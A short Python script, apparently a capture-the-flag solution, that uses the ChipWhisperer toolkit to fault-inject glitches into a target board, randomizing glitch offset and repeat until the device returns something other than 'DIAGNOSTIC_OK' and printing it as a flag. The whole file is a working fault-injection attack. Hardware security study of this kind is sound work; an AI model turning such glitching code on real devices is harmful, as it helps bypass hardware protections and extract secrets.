import time
import random

import chipwhisperer as cw


scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.default_setup()


def reset_target():
    scope.io.nrst = 'low'
    time.sleep(0.003)
    scope.io.nrst = 'high_z'
    time.sleep(0.003)


def main():
    for attempt in range(2000):
        if attempt % 10 == 0:
            print(f"Attempts: {attempt}/2000", end='\r', flush=True)

        offset = random.randint(1400, 1800)
        repeat = random.randint(9, 12)
        
        scope.glitch.ext_offset = offset
        scope.glitch.repeat = repeat
        
        scope.arm()
        target.simpleserial_write("d", b"")
        scope.capture()
        
        response = target.simpleserial_read_witherrors("r", 26)
        
        if response and isinstance(response, dict):
            data = response.get("payload")
            if data:
                text = data.decode("ascii", errors="ignore").strip()
                if "DIAGNOSTIC_OK" not in text and len(text) > 5:
                    print(f"Attempt: {attempt}")
                    print(f"Glitch parameters: offset={offset}, repeat={repeat}")
                    print(f"Flag: {text}")
                    break
        reset_target()

    scope.dis()
    target.dis()


if __name__ == "__main__":
    main()
